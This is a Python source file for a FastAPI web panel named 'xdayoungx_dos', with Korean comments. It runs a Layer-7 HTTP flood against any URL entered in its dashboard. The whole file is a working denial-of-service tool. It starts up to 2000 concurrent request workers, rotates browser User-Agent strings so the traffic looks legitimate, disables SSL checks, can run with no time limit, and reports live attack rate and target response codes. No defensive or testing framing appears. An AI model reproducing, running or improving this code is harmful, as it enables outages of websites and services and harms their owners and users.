# main.py
# FastAPI + aiohttp Layer-7 HTTP Flood Panel
# python -m uvicorn main:app --host 0.0.0.0 --port 8080

import asyncio
import time
import uuid
from typing import Dict, Optional
from collections import defaultdict

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import aiohttp
from aiohttp import ClientTimeout, TCPConnector

app = FastAPI(title="xdayoungx_dos Web Panel")

# ─── 전역 상태 ──────────────────────────────────────────────
class AttackState:
    def __init__(self):
        self.running = False
        self.target: str = ""
        self.workers: int = 50
        self.method: str = "GET"
        self.duration: int = 0          # 0 = infinite
        self.started_at: float = 0
        self.total_sent: int = 0
        self.total_ok: int = 0
        self.total_fail: int = 0
        self.rps_peak: int = 0
        self.status_codes: Dict[str, int] = defaultdict(int)
        self.task: Optional[asyncio.Task] = None
        self.stop_event = asyncio.Event()

state = AttackState()
clients: list[WebSocket] = []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

# ─── 공격 로직 ──────────────────────────────────────────────
async def worker(session: aiohttp.ClientSession, worker_id: int):
    while not state.stop_event.is_set():
        try:
            headers = {
                "User-Agent": USER_AGENTS[worker_id % len(USER_AGENTS)],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
            }
            async with session.request(
                state.method,
                state.target,
                headers=headers,
                ssl=False,
                allow_redirects=False,
            ) as resp:
                state.total_sent += 1
                code = str(resp.status)
                state.status_codes[code] += 1
                if 200 <= resp.status < 400:
                    state.total_ok += 1
                else:
                    state.total_fail += 1
                await resp.read()  # drain
        except Exception:
            state.total_sent += 1
            state.total_fail += 1
            state.status_codes["err"] += 1
        await asyncio.sleep(0)  # yield

async def attack_loop():
    connector = TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
    )
    timeout = ClientTimeout(total=10, connect=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [asyncio.create_task(worker(session, i)) for i in range(state.workers)]
        start = time.time()
        last_count = 0
        while not state.stop_event.is_set():
            if state.duration > 0 and (time.time() - start) >= state.duration:
                break
            await asyncio.sleep(1)
            # RPS 계산
            current = state.total_sent
            rps = current - last_count
            last_count = current
            if rps > state.rps_peak:
                state.rps_peak = rps
            await broadcast_stats(rps)
        # cleanup
        state.stop_event.set()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    state.running = False
    await broadcast_stats(0)

async def broadcast_stats(rps: int = 0):
    uptime = int(time.time() - state.started_at) if state.running else 0
    data = {
        "type": "stats",
        "running": state.running,
        "target": state.target,
        "workers": state.workers,
        "uptime": uptime,
        "sent": state.total_sent,
        "ok": state.total_ok,
        "fail": state.total_fail,
        "rps": rps,
        "rps_peak": state.rps_peak,
        "codes": dict(state.status_codes),
    }
    dead = []
    for ws in clients:
        try:
            await ws.send_json(data)
        except Exception:
            dead.append(ws)
    for ws in dead:
        if ws in clients:
            clients.remove(ws)

# ─── API ───────────────────────────────────────────────────
class StartRequest(BaseModel):
    target: str
    workers: int = 50
    method: str = "GET"
    duration: int = 0

@app.post("/api/start")
async def start_attack(req: StartRequest, background: BackgroundTasks):
    if state.running:
        return {"ok": False, "msg": "이미 실행 중"}
    state.target = req.target.strip()
    state.workers = max(1, min(req.workers, 2000))
    state.method = req.method.upper()
    state.duration = req.duration
    state.total_sent = 0
    state.total_ok = 0
    state.total_fail = 0
    state.rps_peak = 0
    state.status_codes.clear()
    state.stop_event.clear()
    state.started_at = time.time()
    state.running = True
    state.task = asyncio.create_task(attack_loop())
    return {"ok": True, "msg": "공격 시작"}

@app.post("/api/stop")
async def stop_attack():
    if not state.running:
        return {"ok": False, "msg": "실행 중 아님"}
    state.stop_event.set()
    state.running = False
    return {"ok": True, "msg": "중단됨"}

@app.get("/api/status")
async def get_status():
    uptime = int(time.time() - state.started_at) if state.running else 0
    return {
        "running": state.running,
        "target": state.target,
        "workers": state.workers,
        "uptime": uptime,
        "sent": state.total_sent,
        "ok": state.total_ok,
        "fail": state.total_fail,
        "rps_peak": state.rps_peak,
        "codes": dict(state.status_codes),
    }

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws.accept()
    clients.append(ws)
    try:
        while True:
            await ws.receive_text()  # keep alive
    except WebSocketDisconnect:
        if ws in clients:
            clients.remove(ws)

# ─── 프론트엔드 ────────────────────────────────────────────
HTML = """
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>xdayoungx_dos // Web Panel</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;600&display=swap');
  :root {
    --bg: #0a0a0f;
    --card: #12121a;
    --border: #1e1e2e;
    --accent: #ff2d55;
    --green: #00ff9d;
    --text: #e0e0e0;
    --muted: #6b6b80;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', sans-serif;
    min-height: 100vh;
    padding: 24px;
  }
  .container { max-width: 960px; margin: 0 auto; }
  header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 32px;
  }
  h1 {
    font-family: 'JetBrains Mono', monospace;
    font-size: 1.4rem;
    letter-spacing: -0.5px;
  }
  h1 span { color: var(--accent); }
  .badge {
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.75rem;
    padding: 4px 10px;
    border-radius: 4px;
    background: #1a1a24;
    border: 1px solid var(--border);
  }
  .badge.live { border-color: var(--green); color: var(--green); }
  .grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    margin-bottom: 24px;
  }
  @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
  .card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 20px;
  }
  .card h3 {
    font-size: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    margin-bottom: 12px;
  }
  label {
    display: block;
    font-size: 0.8rem;
    color: var(--muted);
    margin-bottom: 6px;
  }
  input, select {
    width: 100%;
    background: #0d0d14;
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 10px 12px;
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.9rem;
    margin-bottom: 14px;
  }
  input:focus, select:focus { outline: none; border-color: var(--accent); }
  .btn-row { display: flex; gap: 10px; }
  button {
    flex: 1;
    padding: 12px;
    border: none;
    border-radius: 6px;
    font-family: 'JetBrains Mono', monospace;
    font-weight: 600;
    font-size: 0.9rem;
    cursor: pointer;
    transition: 0.15s;
  }
  .btn-start { background: var(--accent); color: #fff; }
  .btn-start:hover { background: #ff4d6d; }
  .btn-stop { background: #2a2a3a; color: var(--text); }
  .btn-stop:hover { background: #3a3a4a; }
  .stats {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 12px;
    margin-bottom: 24px;
  }
  @media (max-width: 700px) { .stats { grid-template-columns: 1fr 1fr; } }
  .stat {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 16px;
    text-align: center;
  }
  .stat .val {
    font-family: 'JetBrains Mono', monospace;
    font-size: 1.6rem;
    font-weight: 700;
    color: var(--green);
  }
  .stat .label {
    font-size: 0.7rem;
    color: var(--muted);
    margin-top: 4px;
    text-transform: uppercase;
  }
  .log {
    background: #0d0d14;
    border: 1px solid var(--border);
    border-radius: 8px;
    height: 180px;
    overflow-y: auto;
    padding: 12px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.8rem;
    line-height: 1.5;
  }
  .log div { color: var(--muted); }
  .log .ok { color: var(--green); }
  .log .fail { color: var(--accent); }
</style>
</head>
<body>
<div class="container">
  <header>
    <h1>xdayoungx<span>_dos</span> // panel</h1>
    <div class="badge" id="statusBadge">IDLE</div>
  </header>

  <div class="grid">
    <div class="card">
      <h3>Target Config</h3>
      <label>Target URL</label>
      <input type="text" id="target" placeholder="https://example.com/" value="">
      <label>Workers (1-2000)</label>
      <input type="number" id="workers" value="100" min="1" max="2000">
      <label>Method</label>
      <select id="method">
        <option>GET</option>
        <option>POST</option>
        <option>HEAD</option>
        <option>OPTIONS</option>
      </select>
      <label>Duration (초, 0=무한)</label>
      <input type="number" id="duration" value="0" min="0">
      <div class="btn-row">
        <button class="btn-start" onclick="start()">START</button>
        <button class="btn-stop" onclick="stop()">STOP</button>
      </div>
    </div>

    <div class="card">
      <h3>Live Telemetry</h3>
      <div class="stats" style="grid-template-columns:1fr 1fr; margin:0;">
        <div class="stat"><div class="val" id="rps">0</div><div class="label">RPS</div></div>
        <div class="stat"><div class="val" id="peak">0</div><div class="label">Peak RPS</div></div>
        <div class="stat"><div class="val" id="sent">0</div><div class="label">Sent</div></div>
        <div class="stat"><div class="val" id="uptime">0s</div><div class="label">Uptime</div></div>
      </div>
    </div>
  </div>

  <div class="card" style="margin-bottom:24px;">
    <h3>Response Codes</h3>
    <div id="codes" style="font-family:'JetBrains Mono',monospace; font-size:0.85rem; color:var(--muted);">
      —
    </div>
  </div>

  <div class="card">
    <h3>Event Log</h3>
    <div class="log" id="log"></div>
  </div>
</div>

<script>
  const logEl = document.getElementById('log');
  function log(msg, cls='') {
    const d = document.createElement('div');
    d.className = cls;
    d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logEl.prepend(d);
  }

  let ws;
  function connectWS() {
    ws = new WebSocket(`ws://${location.host}/ws`);
    ws.onmessage = (e) => {
      const d = JSON.parse(e.data);
      if (d.type === 'stats') {
        document.getElementById('rps').textContent = d.rps;
        document.getElementById('peak').textContent = d.rps_peak;
        document.getElementById('sent').textContent = d.sent.toLocaleString();
        document.getElementById('uptime').textContent = d.uptime + 's';
        document.getElementById('statusBadge').textContent = d.running ? 'LIVE' : 'IDLE';
        document.getElementById('statusBadge').className = 'badge' + (d.running ? ' live' : '');
        const codes = Object.entries(d.codes || {}).map(([k,v]) => `${k}:${v}`).join('  ');
        document.getElementById('codes').textContent = codes || '—';
      }
    };
    ws.onclose = () => setTimeout(connectWS, 2000);
  }
  connectWS();

  async function start() {
    const body = {
      target: document.getElementById('target').value,
      workers: parseInt(document.getElementById('workers').value),
      method: document.getElementById('method').value,
      duration: parseInt(document.getElementById('duration').value),
    };
    const res = await fetch('/api/start', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(body)
    });
    const data = await res.json();
    log(data.msg, data.ok ? 'ok' : 'fail');
  }

  async function stop() {
    const res = await fetch('/api/stop', { method: 'POST' });
    const data = await res.json();
    log(data.msg, data.ok ? 'ok' : 'fail');
  }
</script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)